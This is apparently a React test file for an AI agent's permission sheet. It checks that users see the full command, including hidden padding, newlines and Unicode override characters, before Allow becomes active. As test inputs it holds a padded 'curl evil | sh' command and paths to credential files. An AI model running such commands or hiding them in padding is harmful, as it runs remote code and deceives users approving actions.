import { act, cleanup, fireEvent, render } from '@testing-library/react'
import { afterEach, describe, expect, it, vi } from 'vitest'

import { arPermissions } from '@/i18n/ar/permissions'
import { enPermissions } from '@/i18n/en/enPermissions'
import { jaPermissions } from '@/i18n/ja/permissions'
import { ptPtPermissions } from '@/i18n/pt-PT/permissions'
import { zhHantPermissions } from '@/i18n/zh-hant/permissions'
import { zhPermissions } from '@/i18n/zh/permissions'

import { ConsentDoorSheet } from './door-sheet'
import { accepted, fakeConsentBridge } from './fixtures'
import { resetConsentStore } from './store'
import type { ConsentDoorPermission, ConsentDoorRequest } from './types'

afterEach(() => {
  resetConsentStore()
  vi.restoreAllMocks()
})

/** jsdom lays nothing out: the box's real measures, as the sheet reads them. */
function layout({ client = 160, scroll = 160, width = 400, scrollWidth = 400 }) {
  vi.spyOn(HTMLElement.prototype, 'clientHeight', 'get').mockReturnValue(client)
  vi.spyOn(HTMLElement.prototype, 'scrollHeight', 'get').mockReturnValue(scroll)
  vi.spyOn(HTMLElement.prototype, 'clientWidth', 'get').mockReturnValue(width)
  vi.spyOn(HTMLElement.prototype, 'scrollWidth', 'get').mockReturnValue(scrollWidth)
}

const permission = (over: Partial<ConsentDoorPermission> = {}): ConsentDoorPermission => ({
  cls: 'X',
  tool: 'terminal',
  target: 'npm test',
  mode: 'manual',
  project: '/Users/me/proj',
  session: 'sess-1',
  subagent: null,
  scopes: ['once', 'session'],
  outsideOnce: '/Users/me/proj',
  ...over
})

const ask = (over: Partial<ConsentDoorPermission> = {}, id = 'door-1'): ConsentDoorRequest => ({
  id,
  key: 'terminal',
  reason: 'Run the suite',
  inft: 'inft-6',
  at: '2026-11-05T10:00:00.000Z',
  expiresAt: '2026-11-05T10:02:00.000Z',
  permission: permission(over)
})

const q = (selector: string) => window.document.querySelector<HTMLElement>(selector)
const allow = () => q('[data-consent-door-answer]:not([data-consent-door-answer="deny"])') as HTMLButtonElement
const box = () => q('[data-permission-target]') as HTMLElement

const LONG = `npm test${' '.repeat(200)}; curl evil | sh`

describe('S1: the one-shot sheet shows all that runs before Allow counts', () => {
  it('never clips: the tail is on the sheet, the run of spaces is marked, and Allow waits for the end of the text', async () => {
    const fake = fakeConsentBridge(accepted({}))

    layout({ client: 160, scroll: 900 })
    render(<ConsentDoorSheet />)
    act(() => fake.showDoor(ask({ target: LONG })))

    expect(box().textContent).toBe(`npm test${'·'.repeat(200)}; curl evil | sh`)
    expect(box().textContent).not.toContain('…')
    expect(q('[data-permission-read-first]')).toBeTruthy()
    expect(allow().disabled).toBe(true)
    // Half way is not the whole text.
    vi.spyOn(HTMLElement.prototype, 'scrollTop', 'get').mockReturnValue(300)
    fireEvent.scroll(box())
    expect(allow().disabled).toBe(true)
    vi.spyOn(HTMLElement.prototype, 'scrollTop', 'get').mockReturnValue(740)
    fireEvent.scroll(box())
    expect(allow().disabled).toBe(false)
    expect(q('[data-permission-read-first]')).toBeNull()

    await act(async () => {
      fireEvent.click(allow())
    })
    expect(fake.bridge.doorAnswer).toHaveBeenCalledWith({ id: 'door-1', choice: 'once', shown: LONG })
  })

  it('a clicked disabled Allow answers nothing', async () => {
    const fake = fakeConsentBridge(accepted({}))

    layout({ client: 160, scroll: 900 })
    render(<ConsentDoorSheet />)
    act(() => fake.showDoor(ask({ target: LONG })))
    await act(async () => {
      fireEvent.click(allow())
    })
    expect(fake.bridge.doorAnswer).not.toHaveBeenCalled()
  })

  it('Deny never waits and never carries a text', async () => {
    const fake = fakeConsentBridge(accepted({}))

    layout({ client: 160, scroll: 900 })
    render(<ConsentDoorSheet />)
    act(() => fake.showDoor(ask({ target: LONG })))
    await act(async () => {
      fireEvent.click(q('[data-consent-door-answer="deny"]') as HTMLElement)
    })
    expect(fake.bridge.doorAnswer).toHaveBeenCalledWith({ id: 'door-1', choice: 'deny' })
  })

  it('a text that fits is read at once, and a box with no size is never read', () => {
    const fake = fakeConsentBridge(accepted({}))

    layout({ client: 40, scroll: 40 })

    const { unmount } = render(<ConsentDoorSheet />)

    act(() => fake.showDoor(ask()))
    expect(allow().disabled).toBe(false)
    unmount()
    resetConsentStore()

    const again = fakeConsentBridge(accepted({}))

    layout({ client: 0, scroll: 0 })
    render(<ConsentDoorSheet />)
    act(() => again.showDoor(ask()))
    expect(allow().disabled).toBe(true)
  })

  it('a text wider than its box is not shown', () => {
    const fake = fakeConsentBridge(accepted({}))

    layout({ client: 40, scroll: 40, width: 300, scrollWidth: 900 })
    render(<ConsentDoorSheet />)
    act(() => fake.showDoor(ask()))
    expect(allow().disabled).toBe(true)
  })

  it('newlines fill the box under the clip: they are marked and Allow still waits', () => {
    const fake = fakeConsentBridge(accepted({}))

    layout({ client: 160, scroll: 400 })
    render(<ConsentDoorSheet />)
    act(() => fake.showDoor(ask({ target: `npm test${'\n'.repeat(20)}curl evil | sh` })))
    expect(box().textContent).toBe(`npm test${'↵\n'.repeat(20)}curl evil | sh`)
    expect(allow().disabled).toBe(true)
  })

  it('a hidden character is shown by its number, whichever ask it is', () => {
    const fake = fakeConsentBridge(accepted({}))

    layout({})
    render(<ConsentDoorSheet />)
    act(() => fake.showDoor(ask({ outsideOnce: null, target: 'rm ‮txt.exe​' })))
    expect(box().textContent).toBe('rm ⟦U+202E⟧txt.exe⟦U+200B⟧')
  })

  it('the next ask starts unread: reading the first one never carries over', () => {
    const fake = fakeConsentBridge(accepted({}))

    layout({ client: 40, scroll: 40 })
    render(<ConsentDoorSheet />)
    act(() => fake.showDoor(ask()))
    expect(allow().disabled).toBe(false)
    layout({ client: 160, scroll: 900 })
    act(() => fake.showDoor(ask({ target: LONG }, 'door-2')))
    expect(allow().disabled).toBe(true)
  })

  it('an ask that stays inside the Seatbelt keeps its preview, its button and an open Allow', () => {
    const fake = fakeConsentBridge(accepted({}))

    layout({ client: 160, scroll: 900 })
    render(<ConsentDoorSheet />)
    act(() => fake.showDoor(ask({ outsideOnce: null, target: 'x'.repeat(400) })))
    expect(box().textContent).toBe(`${'x'.repeat(160)}…`)
    expect(allow().disabled).toBe(false)
  })
})

describe('Allow once only', () => {
  it('Keychain off: the button says once, and the sheet says why nothing longer is offered', () => {
    const fake = fakeConsentBridge(accepted({}))

    layout({})
    render(<ConsentDoorSheet />)
    act(() => fake.showDoor(ask({ outsideOnce: null, scopes: ['once'], keychainOff: true })))
    expect(allow().textContent).toBe('Allow once')
    expect(q('[data-permission-once-only]')?.textContent).toContain('Keychain setting is off')
    expect(q('[role="radiogroup"]')).toBeNull()
  })

  it('once only for another reason does not blame the Keychain', () => {
    const fake = fakeConsentBridge(accepted({}))

    layout({})
    render(<ConsentDoorSheet />)
    act(() => fake.showDoor(ask({ outsideOnce: null, scopes: ['once'] })))
    expect(allow().textContent).toBe('Allow')
    expect(q('[data-permission-once-only]')).toBeNull()
  })

  it('G28: a wider Allow on a shell ask says later commands run with no ask and stay confined', () => {
    const fake = fakeConsentBridge(accepted({}))

    layout({})
    render(<ConsentDoorSheet />)
    act(() => fake.showDoor(ask()))
    expect(q('[data-permission-later-confined]')).toBeNull()
    fireEvent.click(window.document.querySelectorAll<HTMLElement>('[role="radio"]')[1] as HTMLElement)
    expect(q('[data-permission-later-confined]')?.textContent).toContain('stay inside the Seatbelt')
    expect(q('[data-permission-later-confined]')?.textContent).toContain('Settings › Agent › Permissions')
  })

  it('G28: a read of the credential list says what the agent gets', () => {
    const fake = fakeConsentBridge(accepted({}))

    layout({})
    render(<ConsentDoorSheet />)
    act(() => fake.showDoor(ask({ cls: 'R', tool: 'read_file', outsideOnce: null, scopes: ['once'], credentialRead: true })))
    expect(q('[data-permission-credential-read]')?.textContent).toContain('goes to the model')
    expect(q('[data-permission-credential-file]')).toBeNull()
  })

  it.each([
    ['ar', arPermissions, 'خمسة فحوص', 'يستطيع أن يقرأ', 'أيًّا كانت طريقة كتابة المسار', 'أو حذف تعاودي لا يستطيع أن يقرأ أهدافه أو خياراته قراءة كاملة'],
    ['en', enPermissions, 'five checks', 'it can read as aimed at', 'however the path is written', 'or a recursive delete whose targets or options it cannot fully read'],
    ['ja', jaPermissions, '5つ', '対象とすると読み取れる', 'パスの書き方', '再帰的な削除や、対象またはオプションを完全には読み取れない再帰的な削除'],
    ['pt-PT', ptPtPermissions, 'cinco verificações', 'consiga ler como dirigido', 'seja qual for a forma como o caminho está escrito', 'ou um apagamento recursivo cujos alvos ou opções não consegue ler por inteiro'],
    ['zh', zhPermissions, '五项检查', '它能读出', '无论路径如何书写', '或它无法完整读懂目标或选项的递归删除'],
    ['zh-hant', zhHantPermissions, '五項檢查', '它能讀出', '無論路徑如何書寫', '或它無法完整讀懂目標或選項的遞迴刪除']
  ])(
    'G28: %s says the later commands, the read, and five checks with the stores, the delete one bounded, the fail-closed clause inside the second',
    (_locale, words, fiveChecks, boundedDelete, absoluteDelete, failClosedInSecond) => {
      expect(words.ask.laterConfined).toContain('Seatbelt')
      expect(words.ask.heldRead).toContain('Seatbelt')
      expect(words.modes.ignore.summary).toContain('state.db')
      expect(words.modes.ignore.summary).toContain(fiveChecks)
      expect(words.modes.ignore.summary).toContain(boundedDelete)
      expect(words.modes.ignore.summary).not.toContain(absoluteDelete)
      expect(words.modes.ignore.summary).toContain(failClosedInSecond)
    }
  )

  it('the run outside the Seatbelt with Keychain off says both', () => {
    const fake = fakeConsentBridge(accepted({}))

    layout({ client: 40, scroll: 40 })
    render(<ConsentDoorSheet />)
    act(() => fake.showDoor(ask({ scopes: ['once'], keychainOff: true })))
    expect(q('[data-permission-outside-once]')).toBeTruthy()
    expect(q('[data-permission-once-only]')).toBeTruthy()
    expect(allow().textContent).toBe('Allow once')
  })

  it('with longer choices on offer the button stays Allow and there is no such line', () => {
    const fake = fakeConsentBridge(accepted({}))

    layout({})
    render(<ConsentDoorSheet />)
    act(() => fake.showDoor(ask({ outsideOnce: null })))
    expect(allow().textContent).toBe('Allow')
    expect(q('[data-permission-once-only]')).toBeNull()
  })
})

describe('G2: what the sheet says before the click', () => {
  it('a file outside: names the exact file, and says nothing else opens', () => {
    const fake = fakeConsentBridge(accepted({}))

    layout({ client: 40, scroll: 40 })
    render(<ConsentDoorSheet />)
    act(() =>
      fake.showDoor(ask({ outsideOnce: null, outsideFile: '/Users/me/notes.txt', tool: 'write_file', target: '/Users/me/notes.txt' }))
    )

    const line = q('[data-permission-outside-file]')

    expect(line?.textContent).toContain('/Users/me/notes.txt')
    expect(line?.textContent).toContain('Nothing else in that folder opens')
    expect(q('[data-permission-outside-once]')).toBeNull()
  })

  it('G23: a file that runs later or holds keys gets one more line, and no extra click', () => {
    const fake = fakeConsentBridge(accepted({}))

    layout({ client: 40, scroll: 40 })
    render(<ConsentDoorSheet />)
    act(() =>
      fake.showDoor(
        ask({ outsideOnce: null, outsideFile: '/Users/me/.zshrc', outsideFileRuns: true, tool: 'write_file', target: '/Users/me/.zshrc' })
      )
    )

    expect(q('[data-permission-file-runs]')?.textContent).toContain('Read the path before you allow')
  })

  it('G23-W2: a read says it reads, and gives no line about what runs later', () => {
    const fake = fakeConsentBridge(accepted({}))

    layout({ client: 40, scroll: 40 })
    render(<ConsentDoorSheet />)
    act(() =>
      fake.showDoor(ask({ outsideOnce: null, outsideFile: '/Users/me/.pgpass', outsideFileRead: true, tool: 'read_file', target: '/Users/me/.pgpass' }))
    )

    expect(q('[data-permission-outside-file]')?.textContent).toContain('reads this one file once')
    expect(q('[data-permission-file-runs]')).toBeNull()
  })

  it('G24: a patch says it reads the file and then writes it', () => {
    const fake = fakeConsentBridge(accepted({}))

    layout({ client: 40, scroll: 40 })
    render(<ConsentDoorSheet />)
    act(() => fake.showDoor(ask({ outsideOnce: null, outsideFile: '/Users/me/.aws/credentials', tool: 'patch', target: '/Users/me/.aws/credentials' })))

    expect(q('[data-permission-outside-file]')?.textContent).toContain('reads this one file, then writes it')
  })

  it('G25: the Seatbelt-off credential sheet carries the held-file line', () => {
    const fake = fakeConsentBridge(accepted({}))

    layout({ client: 40, scroll: 40 })
    render(<ConsentDoorSheet />)
    act(() => fake.showDoor(ask({ outsideOnce: null, outsideFile: null, scopes: ['once'], credentialFile: true, tool: 'write_file', target: '/Users/me/.zshrc' })))

    expect(q('[data-permission-credential-file]')?.textContent).toContain('Read the path before you allow')
  })

  it('G25: an ordinary sheet does not', () => {
    const fake = fakeConsentBridge(accepted({}))

    layout({ client: 40, scroll: 40 })
    render(<ConsentDoorSheet />)
    act(() => fake.showDoor(ask({ outsideOnce: null, outsideFile: null, tool: 'write_file', target: '/Users/me/notes.txt' })))

    expect(q('[data-permission-credential-file]')).toBeNull()
  })

  it('G23-W2: a link names the real file and the link', () => {
    const fake = fakeConsentBridge(accepted({}))

    layout({ client: 40, scroll: 40 })
    render(<ConsentDoorSheet />)
    act(() =>
      fake.showDoor(
        ask({
          outsideOnce: null,
          outsideFile: '/Users/me/dotfiles/zshrc',
          outsideFileLink: '/Users/me/.zshrc',
          tool: 'write_file',
          target: '/Users/me/.zshrc'
        })
      )
    )

    expect(q('[data-permission-outside-file]')?.textContent).toContain('/Users/me/dotfiles/zshrc')
    expect(q('[data-permission-file-link]')?.textContent).toContain('/Users/me/.zshrc')
  })

  it('G23: another file gets no such line', () => {
    const fake = fakeConsentBridge(accepted({}))

    layout({ client: 40, scroll: 40 })
    render(<ConsentDoorSheet />)
    act(() => fake.showDoor(ask({ outsideOnce: null, outsideFile: '/Users/me/notes.txt', tool: 'write_file', target: '/Users/me/notes.txt' })))

    expect(q('[data-permission-file-runs]')).toBeNull()
  })

  it('execute_code: says it stays confined, and never that it runs outside', () => {
    const fake = fakeConsentBridge(accepted({}))

    layout({ client: 40, scroll: 40 })
    render(<ConsentDoorSheet />)
    act(() => fake.showDoor(ask({ outsideOnce: null, tool: 'execute_code', target: 'print(1)' })))

    expect(q('[data-permission-stays-confined]')?.textContent).toContain('stays confined')
    expect(q('[data-permission-outside-once]')).toBeNull()
    expect(q('[data-permission-outside-file]')).toBeNull()
  })

  it('a plain shell command: neither line', () => {
    const fake = fakeConsentBridge(accepted({}))

    layout({ client: 40, scroll: 40 })
    render(<ConsentDoorSheet />)
    act(() => fake.showDoor(ask({})))

    expect(q('[data-permission-stays-confined]')).toBeNull()
    expect(q('[data-permission-outside-file]')).toBeNull()
  })
})

describe('G20: the sheet says each thing once, and only what is true', () => {
  it('no session id in the header', () => {
    const fake = fakeConsentBridge(accepted({}))

    render(<ConsentDoorSheet />)
    act(() => fake.showDoor(ask({ session: '20261106_070000_abcdef' })))

    expect(window.document.body.textContent).not.toContain('20261106_07')
  })

  it('the folder once: the note names it, so the In folder line goes', () => {
    const fake = fakeConsentBridge(accepted({}))

    render(<ConsentDoorSheet />)
    act(() => fake.showDoor(ask({ outsideOnce: '/Users/me/proj', project: '/Users/me/proj' })))

    expect(q('[data-permission-outside-once]')?.textContent).toContain('/Users/me/proj')
    expect(q('[data-permission-project]')).toBeNull()
  })

  it('with no note, or a note on another folder, the In folder line stays', () => {
    const fake = fakeConsentBridge(accepted({}))

    render(<ConsentDoorSheet />)
    act(() => fake.showDoor(ask({ outsideOnce: null, project: '/Users/me/proj' })))

    expect(q('[data-permission-project]')?.textContent).toBe('In folder /Users/me/proj')
    cleanup()

    // b4: computer use acts on an app, so a project folder on its sheet means nothing.
    render(<ConsentDoorSheet />)
    act(() => fake.showDoor(ask({ outsideOnce: null, project: '/Users/me/proj', tool: 'computer_use', target: 'Press the key 4 in Calculator' })))

    expect(q('[data-permission-project]')).toBeNull()
  })

  it('no words from the agent: no Why block', () => {
    const fake = fakeConsentBridge(accepted({}))

    render(<ConsentDoorSheet />)
    act(() => fake.showDoor({ ...ask(), reason: '' }))

    expect(q('[data-consent-door-reason]')).toBeNull()
    expect(window.document.body.textContent).not.toContain('in your agent')
  })

  it('words from the agent: the Why block shows them', () => {
    const fake = fakeConsentBridge(accepted({}))

    render(<ConsentDoorSheet />)
    act(() => fake.showDoor(ask()))

    expect(q('[data-consent-door-reason]')?.textContent).toBe('Run the suite')
  })
})
